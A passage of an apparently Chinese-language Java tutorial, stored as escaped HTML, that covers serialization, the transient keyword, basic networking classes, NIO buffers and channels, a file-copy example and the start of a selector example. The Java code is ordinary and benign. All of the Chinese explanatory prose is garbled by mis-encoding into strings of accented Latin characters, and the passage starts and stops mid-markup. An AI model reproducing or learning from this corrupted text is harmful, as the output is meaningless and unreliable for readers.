class=\"n\">objectFile</span><span class=\"o\">));</span>\n    <span class=\"n\">A</span> <span class=\"n\">a2</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">A</span><span class=\"o\">)</span> <span class=\"n\">objectInputStream</span><span class=\"o\">.</span><span class=\"na\">readObject</span><span class=\"o\">();</span>\n    <span class=\"n\">objectInputStream</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a2</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"kd\">implements</span> <span class=\"n\">Serializable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"n\">String</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"n\">A</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">x</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">y</span> <span class=\"o\">=</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">toString</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"s\">&#34;x = &#34;</span> <span class=\"o\">+</span> <span class=\"n\">x</span> <span class=\"o\">+</span> <span class=\"s\">&#34;  &#34;</span> <span class=\"o\">+</span> <span class=\"s\">&#34;y = &#34;</span> <span class=\"o\">+</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>transient</h2><p>transient å…³é”®å­—å¯ä»¥ä½¿ä¸€äº›å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚</p><p>ArrayList ä¸­å­˜å‚¨æ•°æ®çš„æ•°ç»„ elementData æ˜¯ç”¨ transient ä¿®é¥°çš„ï¼Œå› ä¸ºè¿™ä¸ªæ•°ç»„æ˜¯åŠ¨æ€æ‰©å±•çš„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç©ºé—´éƒ½è¢«ä½¿ç”¨ï¼Œå› æ­¤å°±ä¸éœ€è¦æ‰€æœ‰çš„å†…å®¹éƒ½è¢«åºåˆ—åŒ–ã€‚é€šè¿‡é‡å†™åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•ï¼Œä½¿å¾—å¯ä»¥åªåºåˆ—åŒ–æ•°ç»„ä¸­æœ‰å†…å®¹çš„é‚£éƒ¨åˆ†æ•°æ®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">transient</span> <span class=\"n\">Object</span><span class=\"o\">[]</span> <span class=\"n\">elementData</span><span class=\"o\">;</span></code></pre></div><h2>å…­ã€ç½‘ç»œæ“ä½œ</h2><p>Java ä¸­çš„ç½‘ç»œæ”¯æŒï¼š</p><ul><li>InetAddressï¼šç”¨äºè¡¨ç¤ºç½‘ç»œä¸Šçš„ç¡¬ä»¶èµ„æºï¼Œå³ IP åœ°å€ï¼›</li><li>URLï¼šç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼›</li><li>Socketsï¼šä½¿ç”¨ TCP åè®®å®ç°ç½‘ç»œé€šä¿¡ï¼›</li><li>Datagramï¼šä½¿ç”¨ UDP åè®®å®ç°ç½‘ç»œé€šä¿¡ã€‚</li></ul><h2>InetAddress</h2><p>æ²¡æœ‰å…¬æœ‰çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½é€šè¿‡é™æ€æ–¹æ³•æ¥åˆ›å»ºå®ä¾‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">InetAddress</span><span class=\"o\">.</span><span class=\"na\">getByName</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">host</span><span class=\"o\">);</span>\n<span class=\"n\">InetAddress</span><span class=\"o\">.</span><span class=\"na\">getByAddress</span><span class=\"o\">(</span><span class=\"kt\">byte</span><span class=\"o\">[]</span> <span class=\"n\">address</span><span class=\"o\">);</span></code></pre></div><h2>URL</h2><p>å¯ä»¥ç›´æ¥ä» URL ä¸­è¯»å–å­—èŠ‚æµæ•°æ®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">URL</span> <span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">URL</span><span class=\"o\">(</span><span class=\"s\">&#34;http://www.baidu.com&#34;</span><span class=\"o\">);</span>\n\n    <span class=\"cm\">/* å­—èŠ‚æµ */</span>\n    <span class=\"n\">InputStream</span> <span class=\"n\">is</span> <span class=\"o\">=</span> <span class=\"n\">url</span><span class=\"o\">.</span><span class=\"na\">openStream</span><span class=\"o\">();</span>\n\n    <span class=\"cm\">/* å­—ç¬¦æµ */</span>\n    <span class=\"n\">InputStreamReader</span> <span class=\"n\">isr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InputStreamReader</span><span class=\"o\">(</span><span class=\"n\">is</span><span class=\"o\">,</span> <span class=\"s\">&#34;utf-8&#34;</span><span class=\"o\">);</span>\n\n    <span class=\"cm\">/* æä¾›ç¼“å­˜åŠŸèƒ½ */</span>\n    <span class=\"n\">BufferedReader</span> <span class=\"n\">br</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">BufferedReader</span><span class=\"o\">(</span><span class=\"n\">isr</span><span class=\"o\">);</span>\n\n    <span class=\"n\">String</span> <span class=\"n\">line</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">((</span><span class=\"n\">line</span> <span class=\"o\">=</span> <span class=\"n\">br</span><span class=\"o\">.</span><span class=\"na\">readLine</span><span class=\"o\">())</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">line</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">br</span><span class=\"o\">.</span><span class=\"na\">close</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>Sockets</h2><ul><li>ServerSocketï¼šæœåŠ¡å™¨ç«¯ç±»</li><li>Socketï¼šå®¢æˆ·ç«¯ç±»</li><li>æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯é€šè¿‡ InputStream å’Œ OutputStream è¿›è¡Œè¾“å…¥è¾“å‡ºã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-8f9b6ac1fdc8a33da6a35b1b163f806c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"897\" data-rawheight=\"561\" class=\"origin_image zh-lightbox-thumb\" width=\"897\" data-original=\"https://pic1.zhimg.com/v2-8f9b6ac1fdc8a33da6a35b1b163f806c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;897&#39; height=&#39;561&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"897\" data-rawheight=\"561\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"897\" data-original=\"https://pic1.zhimg.com/v2-8f9b6ac1fdc8a33da6a35b1b163f806c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-8f9b6ac1fdc8a33da6a35b1b163f806c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>Datagram</h2><ul><li>DatagramSocketï¼šé€šä¿¡ç±»</li><li>DatagramPacketï¼šæ•°æ®åŒ…ç±»</li></ul><h2>ä¸ƒã€NIO</h2><p>æ–°çš„è¾“å…¥/è¾“å‡º (NIO) åº“æ˜¯åœ¨ JDK 1.4 ä¸­å¼•å…¥çš„ï¼Œå¼¥è¡¥äº†åŸæ¥çš„ I/O çš„ä¸è¶³ï¼Œæä¾›äº†é«˜é€Ÿçš„ã€é¢å‘å—çš„ I/Oã€‚</p><h2>æµä¸å—</h2><p>I/O ä¸ NIO æœ€é‡è¦çš„åŒºåˆ«æ˜¯æ•°æ®æ‰“åŒ…å’Œä¼ è¾“çš„æ–¹å¼ï¼ŒI/O ä»¥æµçš„æ–¹å¼å¤„ç†æ•°æ®ï¼Œè€Œ NIO ä»¥å—çš„æ–¹å¼å¤„ç†æ•°æ®ã€‚</p><p>é¢å‘æµçš„ I/O ä¸€æ¬¡å¤„ç†ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼šä¸€ä¸ªè¾“å…¥æµäº§ç”Ÿä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œä¸€ä¸ªè¾“å‡ºæµæ¶ˆè´¹ä¸€ä¸ªå­—èŠ‚æ•°æ®ã€‚ä¸ºæµå¼æ•°æ®åˆ›å»ºè¿‡æ»¤å™¨éå¸¸å®¹æ˜“ï¼Œé“¾æ¥å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œä»¥ä¾¿æ¯ä¸ªè¿‡æ»¤å™¨åªè´Ÿè´£å¤æ‚å¤„ç†æœºåˆ¶çš„ä¸€éƒ¨åˆ†ã€‚ä¸åˆ©çš„ä¸€é¢æ˜¯ï¼Œé¢å‘æµçš„ I/O é€šå¸¸ç›¸å½“æ…¢ã€‚</p><p>é¢å‘å—çš„ I/O ä¸€æ¬¡å¤„ç†ä¸€ä¸ªæ•°æ®å—ï¼ŒæŒ‰å—å¤„ç†æ•°æ®æ¯”æŒ‰æµå¤„ç†æ•°æ®è¦å¿«å¾—å¤šã€‚ä½†æ˜¯é¢å‘å—çš„ I/O ç¼ºå°‘ä¸€äº›é¢å‘æµçš„ I/O æ‰€å…·æœ‰çš„ä¼˜é›…æ€§å’Œç®€å•æ€§ã€‚</p><p>I/O åŒ…å’Œ NIO å·²ç»å¾ˆå¥½åœ°é›†æˆäº†ï¼Œjava.io.* å·²ç»ä»¥ NIO ä¸ºåŸºç¡€é‡æ–°å®ç°äº†ï¼Œæ‰€ä»¥ç°åœ¨å®ƒå¯ä»¥åˆ©ç”¨ NIO çš„ä¸€äº›ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼Œjava.io.* åŒ…ä¸­çš„ä¸€äº›ç±»åŒ…å«ä»¥å—çš„å½¢å¼è¯»å†™æ•°æ®çš„æ–¹æ³•ï¼Œè¿™ä½¿å¾—å³ä½¿åœ¨é¢å‘æµçš„ç³»ç»Ÿä¸­ï¼Œå¤„ç†é€Ÿåº¦ä¹Ÿä¼šæ›´å¿«ã€‚</p><h2>é€šé“ä¸ç¼“å†²åŒº</h2><h3>1. é€šé“</h3><p>é€šé“ Channel æ˜¯å¯¹åŸ I/O åŒ…ä¸­çš„æµçš„æ¨¡æ‹Ÿï¼Œå¯ä»¥é€šè¿‡å®ƒè¯»å–å’Œå†™å…¥æ•°æ®ã€‚</p><p>é€šé“ä¸æµçš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæµåªèƒ½åœ¨ä¸€ä¸ªæ–¹å‘ä¸Šç§»åŠ¨(ä¸€ä¸ªæµå¿…é¡»æ˜¯ InputStream æˆ–è€… OutputStream çš„å­ç±»)ï¼Œè€Œé€šé“æ˜¯åŒå‘çš„ï¼Œå¯ä»¥ç”¨äºè¯»ã€å†™æˆ–è€…åŒæ—¶ç”¨äºè¯»å†™ã€‚</p><p>é€šé“åŒ…æ‹¬ä»¥ä¸‹ç±»å‹ï¼š</p><ul><li>FileChannelï¼šä»æ–‡ä»¶ä¸­è¯»å†™æ•°æ®ï¼›</li><li>DatagramChannelï¼šé€šè¿‡ UDP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼›</li><li>SocketChannelï¼šé€šè¿‡ TCP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼›</li><li>ServerSocketChannelï¼šå¯ä»¥ç›‘å¬æ–°è¿›æ¥çš„ TCP è¿æ¥ï¼Œå¯¹æ¯ä¸€ä¸ªæ–°è¿›æ¥çš„è¿æ¥éƒ½ä¼šåˆ›å»ºä¸€ä¸ª SocketChannelã€‚</li></ul><h3>2. ç¼“å†²åŒº</h3><p>å‘é€ç»™ä¸€ä¸ªé€šé“çš„æ‰€æœ‰æ•°æ®éƒ½å¿…é¡»é¦–å…ˆæ”¾åˆ°ç¼“å†²åŒºä¸­ï¼ŒåŒæ ·åœ°ï¼Œä»é€šé“ä¸­è¯»å–çš„ä»»ä½•æ•°æ®éƒ½è¦å…ˆè¯»åˆ°ç¼“å†²åŒºä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä¼šç›´æ¥å¯¹é€šé“è¿›è¡Œè¯»å†™æ•°æ®ï¼Œè€Œæ˜¯è¦å…ˆç»è¿‡ç¼“å†²åŒºã€‚</p><p>ç¼“å†²åŒºå®è´¨ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä½†å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ç¼“å†²åŒºæä¾›äº†å¯¹æ•°æ®çš„ç»“æ„åŒ–è®¿é—®ï¼Œè€Œä¸”è¿˜å¯ä»¥è·Ÿè¸ªç³»ç»Ÿçš„è¯»/å†™è¿›ç¨‹ã€‚</p><p>ç¼“å†²åŒºåŒ…æ‹¬ä»¥ä¸‹ç±»å‹ï¼š</p><ul><li>ByteBuffer</li><li>CharBuffer</li><li>ShortBuffer</li><li>IntBuffer</li><li>LongBuffer</li><li>FloatBuffer</li><li>DoubleBuffer</li></ul><h2>ç¼“å†²åŒºçŠ¶æ€å˜é‡</h2><ul><li>capacityï¼šæœ€å¤§å®¹é‡ï¼›</li><li>positionï¼šå½“å‰å·²ç»è¯»å†™çš„å­—èŠ‚æ•°ï¼›</li><li>limitï¼šè¿˜å¯ä»¥è¯»å†™çš„å­—èŠ‚æ•°ã€‚</li></ul><p>çŠ¶æ€å˜é‡çš„æ”¹å˜è¿‡ç¨‹ä¸¾ä¾‹ï¼š</p><p>â‘  æ–°å»ºä¸€ä¸ªå¤§å°ä¸º 8 ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºï¼Œæ­¤æ—¶ position ä¸º 0ï¼Œè€Œ limit = capacity = 8ã€‚capacity å˜é‡ä¸ä¼šæ”¹å˜ï¼Œä¸‹é¢çš„è®¨è®ºä¼šå¿½ç•¥å®ƒã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-8b6864d61dc274d8345ec835ab7661d2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"186\" class=\"origin_image zh-lightbox-thumb\" width=\"552\" data-original=\"https://pic3.zhimg.com/v2-8b6864d61dc274d8345ec835ab7661d2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;552&#39; height=&#39;186&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"186\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"552\" data-original=\"https://pic3.zhimg.com/v2-8b6864d61dc274d8345ec835ab7661d2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-8b6864d61dc274d8345ec835ab7661d2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘¡ ä»è¾“å…¥é€šé“ä¸­è¯»å– 5 ä¸ªå­—èŠ‚æ•°æ®å†™å…¥ç¼“å†²åŒºä¸­ï¼Œæ­¤æ—¶ position ä¸º 5ï¼Œlimit ä¿æŒä¸å˜ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-fc890e5883e578a1eceacd564f4fc5ba_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"496\" data-rawheight=\"148\" class=\"origin_image zh-lightbox-thumb\" width=\"496\" data-original=\"https://pic3.zhimg.com/v2-fc890e5883e578a1eceacd564f4fc5ba_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;496&#39; height=&#39;148&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"496\" data-rawheight=\"148\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"496\" data-original=\"https://pic3.zhimg.com/v2-fc890e5883e578a1eceacd564f4fc5ba_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-fc890e5883e578a1eceacd564f4fc5ba_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘¢ åœ¨å°†ç¼“å†²åŒºçš„æ•°æ®å†™åˆ°è¾“å‡ºé€šé“ä¹‹å‰ï¼Œéœ€è¦å…ˆè°ƒç”¨ flip() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°† limit è®¾ç½®ä¸ºå½“å‰ positionï¼Œå¹¶å°† position è®¾ç½®ä¸º 0ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-fbde9a084339448fa0a8c690a0621420_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"549\" data-rawheight=\"146\" class=\"origin_image zh-lightbox-thumb\" width=\"549\" data-original=\"https://pic1.zhimg.com/v2-fbde9a084339448fa0a8c690a0621420_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;549&#39; height=&#39;146&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"549\" data-rawheight=\"146\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"549\" data-original=\"https://pic1.zhimg.com/v2-fbde9a084339448fa0a8c690a0621420_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-fbde9a084339448fa0a8c690a0621420_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘£ ä»ç¼“å†²åŒºä¸­å– 4 ä¸ªå­—èŠ‚åˆ°è¾“å‡ºç¼“å†²ä¸­ï¼Œæ­¤æ—¶ position è®¾ä¸º 4ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-7d0bc96ce589d38a640241e707e6386e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"527\" data-rawheight=\"158\" class=\"origin_image zh-lightbox-thumb\" width=\"527\" data-original=\"https://pic3.zhimg.com/v2-7d0bc96ce589d38a640241e707e6386e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;527&#39; height=&#39;158&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"527\" data-rawheight=\"158\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"527\" data-original=\"https://pic3.zhimg.com/v2-7d0bc96ce589d38a640241e707e6386e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-7d0bc96ce589d38a640241e707e6386e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘¤ æœ€åéœ€è¦è°ƒç”¨ clear() æ–¹æ³•æ¥æ¸…ç©ºç¼“å†²åŒºï¼Œæ­¤æ—¶ position å’Œ limit éƒ½è¢«è®¾ç½®ä¸ºæœ€åˆä½ç½®ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0c9bcea8c53459f420055a485797d6ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"462\" data-rawheight=\"151\" class=\"origin_image zh-lightbox-thumb\" width=\"462\" data-original=\"https://pic3.zhimg.com/v2-0c9bcea8c53459f420055a485797d6ee_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;462&#39; height=&#39;151&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"462\" data-rawheight=\"151\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"462\" data-original=\"https://pic3.zhimg.com/v2-0c9bcea8c53459f420055a485797d6ee_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-0c9bcea8c53459f420055a485797d6ee_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æ–‡ä»¶ NIO å®ä¾‹</h2><p>ä»¥ä¸‹å±•ç¤ºäº†ä½¿ç”¨ NIO å¿«é€Ÿå¤åˆ¶æ–‡ä»¶çš„å®ä¾‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">fastCopy</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">src</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">dist</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">IOException</span> <span class=\"o\">{</span>\n\n    <span class=\"cm\">/* è·å¾—æºæ–‡ä»¶çš„è¾“å…¥å­—èŠ‚æµ */</span>\n    <span class=\"n\">FileInputStream</span> <span class=\"n\">fin</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileInputStream</span><span class=\"o\">(</span><span class=\"n\">src</span><span class=\"o\">);</span>\n\n    <span class=\"cm\">/* è·å–è¾“å…¥å­—èŠ‚æµçš„æ–‡ä»¶é€šé“ */</span>\n    <span class=\"n\">FileChannel</span> <span class=\"n\">fcin</span> <span class=\"o\">=</span> <span class=\"n\">fin</span><span class=\"o\">.</span><span class=\"na\">getChannel</span><span class=\"o\">();</span>\n\n    <span class=\"cm\">/* è·å–ç›®æ ‡æ–‡ä»¶çš„è¾“å‡ºå­—èŠ‚æµ */</span>\n    <span class=\"n\">FileOutputStream</span> <span class=\"n\">fout</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FileOutputStream</span><span class=\"o\">(</span><span class=\"n\">dist</span><span class=\"o\">);</span>\n\n    <span class=\"cm\">/* è·å–è¾“å‡ºå­—èŠ‚æµçš„æ–‡ä»¶é€šé“ */</span>\n    <span class=\"n\">FileChannel</span> <span class=\"n\">fcout</span> <span class=\"o\">=</span> <span class=\"n\">fout</span><span class=\"o\">.</span><span class=\"na\">getChannel</span><span class=\"o\">();</span>\n\n    <span class=\"cm\">/* ä¸ºç¼“å†²åŒºåˆ†é… 1024 ä¸ªå­—èŠ‚ */</span>\n    <span class=\"n\">ByteBuffer</span> <span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"n\">ByteBuffer</span><span class=\"o\">.</span><span class=\"na\">allocateDirect</span><span class=\"o\">(</span><span class=\"n\">1024</span><span class=\"o\">);</span>\n\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n        <span class=\"cm\">/* ä»è¾“å…¥é€šé“ä¸­è¯»å–æ•°æ®åˆ°ç¼“å†²åŒºä¸­ */</span>\n        <span class=\"kt\">int</span> <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">fcin</span><span class=\"o\">.</span><span class=\"na\">read</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">);</span>\n\n        <span class=\"cm\">/* read() è¿”å› -1 è¡¨ç¤º EOF */</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">r</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">break</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n\n        <span class=\"cm\">/* åˆ‡æ¢è¯»å†™ */</span>\n        <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">flip</span><span class=\"o\">();</span>\n\n        <span class=\"cm\">/* æŠŠç¼“å†²åŒºçš„å†…å®¹å†™å…¥è¾“å‡ºæ–‡ä»¶ä¸­ */</span>\n        <span class=\"n\">fcout</span><span class=\"o\">.</span><span class=\"na\">write</span><span class=\"o\">(</span><span class=\"n\">buffer</span><span class=\"o\">);</span>\n\n        <span class=\"cm\">/* æ¸…ç©ºç¼“å†²åŒº */</span>\n        <span class=\"n\">buffer</span><span class=\"o\">.</span><span class=\"na\">clear</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>é€‰æ‹©å™¨</h2><p>NIO å¸¸å¸¸è¢«å«åšéé˜»å¡ IOï¼Œä¸»è¦æ˜¯å› ä¸º NIO åœ¨ç½‘ç»œé€šä¿¡ä¸­çš„éé˜»å¡ç‰¹æ€§è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p><p>NIO å®ç°äº† IO å¤šè·¯å¤ç”¨ä¸­çš„ Reactor æ¨¡å‹ï¼Œä¸€ä¸ªçº¿ç¨‹ Thread ä½¿ç”¨ä¸€ä¸ªé€‰æ‹©å™¨ Selector é€šè¿‡è½®è¯¢çš„æ–¹å¼å»ç›‘å¬å¤šä¸ªé€šé“ Channel ä¸Šçš„äº‹ä»¶ï¼Œä»è€Œè®©ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥å¤„ç†å¤šä¸ªäº‹ä»¶ã€‚</p><p>é€šè¿‡é…ç½®ç›‘å¬çš„é€šé“ Channel ä¸ºéé˜»å¡ï¼Œé‚£ä¹ˆå½“ Channel ä¸Šçš„ IO äº‹ä»¶è¿˜æœªåˆ°è¾¾æ—¶ï¼Œå°±ä¸ä¼šè¿›å…¥é˜»å¡çŠ¶æ€ä¸€ç›´ç­‰å¾…ï¼Œè€Œæ˜¯ç»§ç»­è½®è¯¢å…¶å®ƒ Channelï¼Œæ‰¾åˆ° IO äº‹ä»¶å·²ç»åˆ°è¾¾çš„ Channel æ‰§è¡Œã€‚</p><p>å› ä¸ºåˆ›å»ºå’Œåˆ‡æ¢çº¿ç¨‹çš„å¼€é”€å¾ˆå¤§ï¼Œå› æ­¤ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†å¤šä¸ªäº‹ä»¶è€Œä¸æ˜¯ä¸€ä¸ªçº¿ç¨‹å¤„ç†ä¸€ä¸ªäº‹ä»¶ï¼Œå¯¹äº IO å¯†é›†å‹çš„åº”ç”¨å…·æœ‰å¾ˆå¥½åœ°æ€§èƒ½ã€‚</p><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰å¥—æ¥å­— Channel æ‰èƒ½é…ç½®ä¸ºéé˜»å¡ï¼Œè€Œ FileChannel ä¸èƒ½ï¼Œä¸º FileChannel é…ç½®éé˜»å¡ä¹Ÿæ²¡æœ‰æ„ä¹‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-a36df1391f2ad8c834356eeb17d9a37f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"620\" data-rawheight=\"430\" class=\"origin_image zh-lightbox-thumb\" width=\"620\" data-original=\"https://pic4.zhimg.com/v2-a36df1391f2ad8c834356eeb17d9a37f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;620&#39; height=&#39;430&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"620\" data-rawheight=\"430\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"620\" data-original=\"https://pic4.zhimg.com/v2-a36df1391f2ad8c834356eeb17d9a37f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-a36df1391f2ad8c834356eeb17d9a37f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>1. åˆ›å»ºé€‰æ‹©å™¨</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Selector</span> <span class=\"n\">selector</span> <span class=\"o\">=</span> <span class=\"n\">Selector</span><span class=\"o\">.</span><span class=\"na\">open</span><span class=\"o\">();</span></code></pre></div><h3>2. å°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Š</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">ServerSocketChannel</span> <span class=\"n\">ssChannel</span> <span class=\"o\">=</span> <span class=\"n\">ServerSocketChannel</span><span class=\"o\">.</span><span class=\"na\">open</span><span class=\"o\">();</span>\n<span class=\"n\">ssChannel</span><span class=\"o\">.</span><span class=\"na\">configureBlocking</span><span class=\"o\">(</span><span 